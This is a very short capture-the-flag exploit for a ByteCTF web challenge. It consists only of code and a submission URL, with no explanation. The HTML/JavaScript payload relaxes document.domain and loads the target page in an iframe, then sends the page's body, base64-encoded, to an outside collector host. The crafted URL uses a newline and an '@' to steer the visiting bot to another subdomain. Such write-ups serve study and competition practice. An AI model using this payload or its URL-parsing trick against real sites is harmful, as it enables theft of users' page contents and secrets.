Exploit

```html
document.domain="bytectf.live" </script> 
<iframe id=test src='http://a.bytectf.live:30001/?keyword=ByteCTF'></iframe>
<script> 
setTimeout('location.href="http://host/lih3iu?a="+window.btoa(document.getElementById("test").contentWindow.document.body.innerHTML)',2500)
```

Submit

```
http://a.bytectf.live:30001/%0a@c.bytectf.live:30002/?action=post&id=7e6270589326ede96d6faf29afb3bdec
```

